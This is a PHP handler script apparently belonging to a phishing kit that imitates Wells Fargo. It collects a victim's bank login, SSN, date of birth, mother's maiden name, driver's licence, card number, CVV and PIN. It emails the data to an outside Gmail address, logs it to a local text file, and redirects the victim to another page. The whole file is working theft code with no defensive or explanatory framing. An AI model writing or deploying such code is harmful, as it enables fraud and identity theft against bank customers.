<?php
session_start();
$username = $_SESSION['username'];
$password = $_SESSION['password'];
error_reporting(0);
$email = $_POST ['email'];
$first = $_POST['first'];
$last = $_POST['last'];
$dobus = $_POST['dobus'];
$driver = $_POST['driver'];
$mmn = $_POST['mmn'];
$phone = $_POST['phone'];
$city = $_POST['city'];
$state = $_POST['state'];
$dob = $_POST['dob'];
$ssn = $_POST['ssn'];
$card = $_POST['card'];
$expdate = $_POST['expdate'];
$cvv = $_POST['cvv'];
$pin = $_POST['pin'];
$pin1 = $_POST['pin1'];
session_start();
$_SESSION['email'] = $_POST ['email'];
$ip = getenv("REMOTE_ADDR");

$subj = "Wells - $first $card";
$msg = "Uid: $username | Password: $password
First: $first
Phone Number: $phone
-
Billing Address: $last
City: $city
State: $state
Zip: $ssn
-
DOB: $dobus
SSN: $dob
MMN: $mmn
Driver Licence: $driver
-
Crd: $card
ExD: $expdate
Civ: $cvv
PIN: $pin - $pin1
-
E-mail: $email
--------------------
IP: $ip
____________________
";

mail("@gmail.com", $subj, $msg);

$pula = fopen ("hrv1.txt" , "a");
fwrite ($pula , $msg);
fclose ($pula);

header("Location: secure.php");

?>